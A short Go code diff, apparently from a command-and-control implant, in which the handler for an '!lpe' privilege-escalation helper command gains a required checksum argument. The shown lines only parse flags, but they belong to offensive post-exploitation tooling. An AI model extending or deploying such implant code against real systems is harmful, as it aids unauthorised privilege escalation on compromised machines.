@@ -21,13 +21,14 @@ func platformC2CommandsHandler(cmdSlice []string) (out string) {
 		// LPE helper
 		// !lpe --script_name script_name
 		scriptName := flags.StringP("script_name", "s", "", "Script name")
+		checksum := flags.StringP("checksum", "c", "", "Checksum")
 		flags.Parse(cmdSlice[1:])
-		if *scriptName == "" {
+		if *scriptName == "" || *checksum == "" {
 			out = fmt.Sprintf("Error: args error: %s", cmdSlice)
 			log.Print(out)
 			return
 		}
-		out = runLPEHelper(*scriptName)
+		out = runLPEHelper(*scriptName, *checksum)
 		return
 	}
 
